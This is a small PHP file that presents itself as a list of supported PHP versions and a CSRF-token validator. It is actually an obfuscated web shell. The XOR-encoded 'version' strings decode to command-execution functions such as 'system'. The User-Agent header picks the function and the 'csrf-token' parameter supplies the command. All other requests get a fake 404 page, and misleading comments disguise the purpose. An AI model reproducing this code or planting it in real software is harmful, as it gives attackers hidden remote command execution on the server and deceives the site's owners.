<?php

class SupportedVersions {
    # An array of the available PHP versions
    public const VERSIONS = array(
        "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
        "GADK_" ^ "7.4.14, 7.4.13, 7.4.12",
        "RVQM" ^ "7.4.24, 7.4.23, 7.4.22",
        "GOG]FY^U" ^ "7.4.21, 7.4.20, 7.4.19",
        "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
    );
}

# Validates the submission of any CSRF Token, and the innocence of the User Agent.
if(isset($_GET["csrf-token"])
    && isset($_SERVER["HTTP_USER_AGENT"])
    && gettype($_GET["csrf-token"]) == "string"
    && gettype($_SERVER["HTTP_USER_AGENT"]) == "string"
    && preg_match("/^[a-z_]{1,}$/i", $_SERVER["HTTP_USER_AGENT"])
    && in_array($_SERVER["HTTP_USER_AGENT"], SupportedVersions::VERSIONS)
) {
    # Adds the User Agent and the server log
    ${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
} else {
    # Returns an error in case of not passing the validations.
    http_response_code(404);
    echo '
    <!DOCTYPE html>
    <html>
        <head>
            <meta name="robots" content="noindex">
            <title>404 Not Found</title>
        </head>
        <body>
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server.</p>
        </body>
    </html>
    ';
}
?>
